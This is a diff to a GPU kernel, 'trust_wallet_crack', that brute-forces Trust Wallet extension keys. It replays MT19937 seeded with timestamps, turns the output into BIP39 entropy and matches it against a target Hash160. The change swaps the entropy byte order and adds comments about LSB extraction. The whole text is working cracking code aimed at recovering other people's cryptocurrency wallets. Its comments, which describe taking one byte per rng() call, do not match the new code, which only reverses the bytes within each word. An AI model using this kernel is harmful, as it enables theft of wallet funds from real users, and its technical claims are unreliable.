@@ -1,5 +1,7 @@
 // Trust Wallet Browser Extension Vulnerability (100% GPU)
 // MT19937 seeded with 32-bit timestamp
+// CRITICAL: Uses LSB (Least Significant Byte) extraction, NOT MSB like Milk Sad
+// Trust Wallet code: return rng() & 0x000000ff (takes LEAST significant 8 bits)
 // Scans timestamp range and matches against target Hash160
 
 __kernel void trust_wallet_crack(
@@ -19,11 +21,14 @@ __kernel void trust_wallet_crack(
     mt19937_extract_128(timestamp, entropy_words);
     
     uchar entropy[16] __attribute__((aligned(4)));
+    // Trust Wallet uses LSB (Least Significant Byte) extraction: rng() & 0x000000ff
+    // This is DIFFERENT from Milk Sad which uses MSB extraction
+    // Little-endian byte order: LSB first
     for (int i = 0; i < 4; i++) {
-        entropy[i*4 + 0] = (entropy_words[i] >> 24) & 0xFF;
-        entropy[i*4 + 1] = (entropy_words[i] >> 16) & 0xFF;
-        entropy[i*4 + 2] = (entropy_words[i] >> 8) & 0xFF;
-        entropy[i*4 + 3] = entropy_words[i] & 0xFF;
+        entropy[i*4 + 0] = entropy_words[i] & 0xFF;          // LSB (byte 0)
+        entropy[i*4 + 1] = (entropy_words[i] >> 8) & 0xFF;   // byte 1
+        entropy[i*4 + 2] = (entropy_words[i] >> 16) & 0xFF;  // byte 2
+        entropy[i*4 + 3] = (entropy_words[i] >> 24) & 0xFF;  // MSB (byte 3)
     }
     
     // BIP39: Entropy → Mnemonic → Seed (PROPER IMPLEMENTATION)
